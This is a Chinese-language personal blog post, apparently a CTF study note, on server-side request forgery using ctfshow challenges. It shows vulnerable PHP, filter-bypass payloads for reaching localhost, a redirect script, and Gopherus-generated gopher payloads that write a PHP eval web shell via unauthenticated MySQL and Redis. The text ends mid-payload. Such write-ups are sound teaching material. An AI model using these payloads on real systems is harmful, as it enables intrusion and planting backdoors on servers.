@@ -1,0 +1,457 @@
+<!doctype html>
+<html lang="zh"><head>
+<title>SSRF - Ciallo～(∠・ω&lt; )⌒★，欢迎来到SourceRev的个人博客</title>
+<meta charset="UTF-8">
+<meta name="keywords" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+
+<link rel="shortcut icon" href="https://cravatar.cn/avatar/d4bd192ba44e2f9f35347b5123c7fa7e?s=400&amp;r=G&amp;d=mp&amp;ver=1681303077" type="image/jpg" />
+<meta name="description" content="SSRFSSRF意为服务端请求伪造(Server Side Request Forge)。攻击者利用SSRF漏洞通过服务器发起伪造请求，这样就可以访问内网的数据，进行内网信息探测或者内网漏洞利用。 SSRF漏洞形成的原因是：应用程序存在可以从其他服务器获取数据的功能，但是对服务器的地址并没有做严格的过滤，导致应用程序可以访问任意的URL链接。攻击者通过精心构造URL链接 例如（ctfshow we">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF">
+<meta property="og:url" content="http://sourcerev.github.io/2023/01/09/SSRF1/index.html">
+<meta property="og:site_name" content="Ciallo～(∠・ω&lt; )⌒★，欢迎来到SourceRev的个人博客">
+<meta property="og:description" content="SSRFSSRF意为服务端请求伪造(Server Side Request Forge)。攻击者利用SSRF漏洞通过服务器发起伪造请求，这样就可以访问内网的数据，进行内网信息探测或者内网漏洞利用。 SSRF漏洞形成的原因是：应用程序存在可以从其他服务器获取数据的功能，但是对服务器的地址并没有做严格的过滤，导致应用程序可以访问任意的URL链接。攻击者通过精心构造URL链接 例如（ctfshow we">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-01-08T18:23:56.000Z">
+<meta property="article:modified_time" content="2023-04-12T12:20:25.482Z">
+<meta property="article:author" content="SourceRev">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1681305066759">
+
+<link rel="stylesheet" href="/css/style.css?v=1681305066759">
+
+
+
+
+
+<link rel="stylesheet" href="/custom.css?v=1681305066759">
+
+
+
+
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+
+
+<script async src="/js/app.js?v=1681305066759"></script>
+
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+
+  gtag("config", "G-4D4ZJ9G024");
+</script>
+<meta name="generator" content="Hexo 6.3.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(/img/44.png)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="SourceRev"><img src="https://cravatar.cn/avatar/d4bd192ba44e2f9f35347b5123c7fa7e?s=400&amp;r=G&amp;d=mp&amp;ver=1681303077" alt="SourceRev"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="SourceRev">
+            <img src="https://cravatar.cn/avatar/d4bd192ba44e2f9f35347b5123c7fa7e?s=400&amp;r=G&amp;d=mp&amp;ver=1681303077" alt="SourceRev" alt="SourceRev">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>13</div>
+        <div><span>标签</span>12</div>
+        <div><span>分类</span>4</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博主">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博主
+            </div>
+        </a>
+        
+    </div>
+    
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=site:nexmoe.com" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
+            </form>
+         
+    </div>
+</div>
+
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://jq.qq.com/?_wv=1027&k=5CfKHun"
+			target="_blank"
+			mdui-tooltip="{content: 'QQ群'}"
+			style="
+				color: rgb(249, 174, 8);
+				background-color: rgba(249, 174, 8, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-QQ"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://github.com/nexmoe/"
+			target="_blank"
+			mdui-tooltip="{content: 'GitHub'}"
+			style="
+				color: rgb(25, 23, 23);
+				background-color: rgba(25, 23, 23, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ACM/">ACM</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/CTF/">CTF</a>
+          <span class="category-list-count">7</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/开发/">开发</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/机器学习/">机器学习</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/DP/" style="font-size: 10px;">DP</a> <a href="/tags/Laravel/" style="font-size: 10px;">Laravel</a> <a href="/tags/MySQL/" style="font-size: 10px;">MySQL</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 10px;">SSTI</a> <a href="/tags/Yii%E6%A8%A1%E6%9D%BF/" style="font-size: 10px;">Yii模板</a> <a href="/tags/pickle/" style="font-size: 10px;">pickle</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/web/" style="font-size: 20px;">web</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 15px;">反序列化</a> <a href="/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/" style="font-size: 10px;">神经网络</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 10px;">算法</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(12);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a><span class="archive-list-count">11</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">最新文章</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/02/02/SSTI1/">缓冲区溢出</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/SSRF1/">SSRF</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/21/pwn_overflow/">缓冲区溢出</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/16/deeplearning/">深度学习基础</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/11/algorithm_dp/">DP模板</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+   
+    <div class="nexmoe-copyright">
+        &copy; 2023 SourceRev
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        <br><a> </a>
+
+    </div>
+</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: 62.5%;"> 
+            <img src="/img/7.png" alt="SSRF" loading="lazy">
+            <h1>SSRF</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2023年01月09日</a>
+        
+            <a class="nexmoefont icon-appstore-fill -link" href="/categories/CTF/">CTF</a>
+        
+        
+    <a><i class="nexmoefont icon-areachart"></i>约1.2k字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要6分钟</a>
+
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRF意为服务端请求伪造(Server Side Request Forge)。攻击者利用SSRF漏洞通过服务器发起伪造请求，这样就可以访问内网的数据，进行内网信息探测或者内网漏洞利用。</p>
+<p><strong>SSRF漏洞形成的原因</strong>是：应用程序存在可以从其他服务器获取数据的功能，但是对服务器的地址并没有做严格的过滤，导致应用程序可以访问任意的URL链接。攻击者通过精心构造URL链接</p>
+<p>例如（ctfshow web352）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时我们可以构造 payload</p>
+<blockquote>
+<p>url&#x3D;<a target="_blank" rel="noopener" href="http://localhost/flag.php">http://localhost/flag.php</a></p>
+</blockquote>
+<p>PS. 可以进制转换绕过 127.0.0.1 &#x3D;&#x3D;&gt; 0177.0.0.1 (八进制)</p>
+<p>首先，我们必须要知道一个函数 <code>parse_url</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果------------------------------</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname			//</span><br><span class="line">    [user] =&gt; username			@前</span><br><span class="line">    [pass] =&gt; password			@前</span><br><span class="line">    [path] =&gt; /path				/</span><br><span class="line">    [query] =&gt; arg=value		?以后的key=value</span><br><span class="line">    [fragment] =&gt; anchor		#以后的部分</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h2 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h2><ol>
+<li><p>对于 <code>(preg_match(&#39;/localhost|1|0|。/i&#39;, $url)</code> ，可以使用 <code>sudo.cc</code> 代替 <code>127.0.0.1</code> </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload : url=http:<span class="regexp">//</span>sudo.cc/flag.php</span><br></pre></td></tr></table></figure>
+
+</li>
+<li><p>对于 <code>preg_match(&#39;/^http:\/\/ctf\..*show$/i&#39;,$url</code> ，相当于post值必须要为 <code>http://ctf.*show</code></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload : url=http:<span class="regexp">//</span>ctf.@<span class="number">127.0</span>.<span class="number">0.1</span>/flag.php<span class="comment">#show</span></span><br><span class="line">     	  url=http:<span class="regexp">//</span>ctf.@<span class="number">127.0</span>.<span class="number">0.1</span>/flag.php?show</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h2><ul>
+<li><p>若 <code>(strlen($host)&lt;=5</code> ，可以考虑 <code>127.1</code></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">payload</span> : url=http://<span class="number">127</span>.<span class="number">1</span>/flag.php</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>若 <code>(strlen($host)&lt;=3</code> ，可以考虑 <code>0</code></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="regexp">//</span><span class="number">0</span>/flag.php</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="绕过验证器"><a href="#绕过验证器" class="headerlink" title="绕过验证器"></a>绕过验证器</h2><p><code>gethostbyname</code> ：返回主机名对应的 IPv4地址。 </p>
+<p><code>FILTER_VALIDATE_IP</code> ： 过滤器把值作为 IP 地址来验证（如果成功，则返回被过滤的数据；如果失败，则返回 FALSE）：</p>
+<ul>
+<li>FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）。</li>
+<li>FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）。</li>
+<li>FILTER_FLAG_NO_PRIV_RANGE - 要求值不在 RFC 指定的私有范围 IP 内（比如 192.168.0.1）。</li>
+<li>FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</li>
+</ul>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">保留地址主要在以下四类：</span><br><span class="line"><span class="keyword">A</span>类：<span class="number">10.0.0.0</span>－<span class="number">10.255.255.255</span>（长度相当于<span class="number">1</span>个<span class="keyword">A</span>类IP地址）</span><br><span class="line"> 	<span class="number">100.64.0.0</span>－<span class="number">100.127.255.255</span></span><br><span class="line">B类：<span class="number">172.16.0.0</span>－<span class="number">172.31.255.255</span>（长度相当于<span class="number">16</span>个连续的B类IP地址）</span><br><span class="line">C类：<span class="number">192.168.0.0</span>－<span class="number">192.168.255.255</span>（长度相当于<span class="number">256</span>个连续的C类IP地址）</span><br></pre></td></tr></table></figure>
+
+<p>绕过方式：可以使用公网ip的服务器，脚本如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h2><p>Gopher协议是internet的一个信息查找系统，俗称万能协议，可以通过gopher访问对应计算机上的其他资源，例如利用gopher实现：GET请求，POST请求，内网的redis，mysql(以及各类关系型数据库)未授权访问，以及MongoDB，Memcache等。</p>
+<blockquote>
+<p><strong>gopher协议数据格式：</strong>gopher:&#x2F;&#x2F;ip:port&#x2F;_TCP&#x2F;IP数据流</p>
+</blockquote>
+<h3 id="打无密码的mysql"><a href="#打无密码的mysql" class="headerlink" title="打无密码的mysql"></a>打无密码的mysql</h3><p>工具：<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus.git">https://github.com/tarunkant/Gopherus.git</a></p>
+<p>指令如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit mysql</span><br><span class="line">root</span><br><span class="line">select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">gopher:</span>//<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">3306</span>/_<span class="variable">%a3</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%01</span><span class="variable">%85</span><span class="variable">%a6</span><span class="variable">%ff</span><span class="variable">%01</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%01</span><span class="variable">%21</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%72</span><span class="variable">%6</span>f<span class="variable">%6</span>f<span class="variable">%74</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%6</span>d<span class="variable">%79</span><span class="variable">%73</span><span class="variable">%71</span><span class="variable">%6</span><span class="keyword">c</span><span class="variable">%5</span>f<span class="variable">%6</span>e<span class="variable">%61</span><span class="variable">%74</span><span class="variable">%69</span><span class="variable">%76</span><span class="variable">%65</span><span class="variable">%5</span>f<span class="variable">%70</span><span class="variable">%61</span><span class="variable">%73</span><span class="variable">%73</span><span class="variable">%77</span><span class="variable">%6</span>f<span class="variable">%72</span><span class="variable">%64</span><span class="variable">%00</span><span class="variable">%66</span><span class="variable">%03</span><span class="variable">%5</span>f<span class="variable">%6</span>f<span class="variable">%73</span><span class="variable">%05</span><span class="variable">%4</span><span class="keyword">c</span><span class="variable">%69</span><span class="variable">%6</span>e<span class="variable">%75</span><span class="variable">%78</span><span class="variable">%0</span><span class="keyword">c</span><span class="variable">%5</span>f<span class="variable">%63</span><span class="variable">%6</span><span class="keyword">c</span><span class="variable">%69</span><span class="variable">%65</span><span class="variable">%6</span>e<span class="variable">%74</span><span class="variable">%5</span>f<span class="variable">%6</span>e<span class="variable">%61</span><span class="variable">%6</span>d<span class="variable">%65</span><span class="variable">%08</span><span class="variable">%6</span><span class="keyword">c</span><span class="variable">%69</span><span class="variable">%62</span><span class="variable">%6</span>d<span class="variable">%79</span><span class="variable">%73</span><span class="variable">%71</span><span class="variable">%6</span><span class="keyword">c</span><span class="variable">%04</span><span class="variable">%5</span>f<span class="variable">%70</span><span class="variable">%69</span><span class="variable">%64</span><span class="variable">%05</span><span class="variable">%32</span><span class="variable">%37</span><span class="variable">%32</span><span class="variable">%35</span><span class="variable">%35</span><span class="variable">%0</span>f<span class="variable">%5</span>f<span class="variable">%63</span><span class="variable">%6</span><span class="keyword">c</span><span class="variable">%69</span><span class="variable">%65</span><span class="variable">%6</span>e<span class="variable">%74</span><span class="variable">%5</span>f<span class="variable">%76</span><span class="variable">%65</span><span class="variable">%72</span><span class="variable">%73</span><span class="variable">%69</span><span class="variable">%6</span>f<span class="variable">%6</span>e<span class="variable">%06</span><span class="variable">%35</span><span class="variable">%2</span>e<span class="variable">%37</span><span class="variable">%2</span>e<span class="variable">%32</span><span class="variable">%32</span><span class="variable">%09</span><span class="variable">%5</span>f<span class="variable">%70</span><span class="variable">%6</span><span class="keyword">c</span><span class="variable">%61</span><span class="variable">%74</span><span class="variable">%66</span><span class="variable">%6</span>f<span class="variable">%72</span><span class="variable">%6</span>d<span class="variable">%06</span><span class="variable">%78</span><span class="variable">%38</span><span class="variable">%36</span><span class="variable">%5</span>f<span class="variable">%36</span><span class="variable">%34</span><span class="variable">%0</span><span class="keyword">c</span><span class="variable">%70</span><span class="variable">%72</span><span class="variable">%6</span>f<span class="variable">%67</span><span class="variable">%72</span><span class="variable">%61</span><span class="variable">%6</span>d<span class="variable">%5</span>f<span class="variable">%6</span>e<span class="variable">%61</span><span class="variable">%6</span>d<span class="variable">%65</span><span class="variable">%05</span><span class="variable">%6</span>d<span class="variable">%79</span><span class="variable">%73</span><span class="variable">%71</span><span class="variable">%6</span><span class="keyword">c</span><span class="variable">%45</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%03</span><span class="variable">%73</span><span class="variable">%65</span><span class="variable">%6</span><span class="keyword">c</span><span class="variable">%65</span><span class="variable">%63</span><span class="variable">%74</span><span class="variable">%20</span><span class="variable">%22</span><span class="variable">%3</span><span class="keyword">c</span><span class="variable">%3</span>f<span class="variable">%70</span><span class="variable">%68</span><span class="variable">%70</span><span class="variable">%20</span><span class="variable">%65</span><span class="variable">%76</span><span class="variable">%61</span><span class="variable">%6</span><span class="keyword">c</span><span class="variable">%28</span><span class="variable">%24</span><span class="variable">%5</span>f<span class="variable">%50</span><span class="variable">%4</span>f<span class="variable">%53</span><span class="variable">%54</span><span class="variable">%5</span>b<span class="variable">%31</span><span class="variable">%5</span>d<span class="variable">%29</span><span class="variable">%3</span>b<span class="variable">%3</span>f<span class="variable">%3</span>e<span class="variable">%22</span><span class="variable">%20</span><span class="variable">%69</span><span class="variable">%6</span>e<span class="variable">%74</span><span class="variable">%6</span>f<span class="variable">%20</span><span class="variable">%6</span>f<span class="variable">%75</span><span class="variable">%74</span><span class="variable">%66</span><span class="variable">%69</span><span class="variable">%6</span><span class="keyword">c</span><span class="variable">%65</span><span class="variable">%20</span><span class="variable">%22</span><span class="variable">%2</span>f<span class="variable">%76</span><span class="variable">%61</span><span class="variable">%72</span><span class="variable">%2</span>f<span class="variable">%77</span><span class="variable">%77</span><span class="variable">%77</span><span class="variable">%2</span>f<span class="variable">%68</span><span class="variable">%74</span><span class="variable">%6</span>d<span class="variable">%6</span><span class="keyword">c</span><span class="variable">%2</span>f<span class="variable">%31</span><span class="variable">%2</span>e<span class="variable">%70</span><span class="variable">%68</span><span class="variable">%70</span><span class="variable">%22</span><span class="variable">%01</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%01</span></span><br><span class="line"># 可能需要对端口号后面的数据进行二次url加密</span><br></pre></td></tr></table></figure>
+
+<p>最后进行蚁剑连接即可</p>
+<h3 id="攻击redits"><a href="#攻击redits" class="headerlink" title="攻击redits"></a>攻击redits</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit mysql</span><br><span class="line">PHPShell</span><br><span class="line">&lt;?php eval($_POST[&#x27;1&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">url</span>=gopher://<span class="number">127.0.0.1:6379</span>/_%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">248</span>%<span class="number">0</span>D%<span class="number">0</span>Aflushall%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A3%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">241</span>%<span class="number">0</span>D%<span class="number">0</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2430</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>eval%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>B%<span class="number">271</span>%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Adir%<span class="number">0</span>D%<span class="number">0</span>A%<span 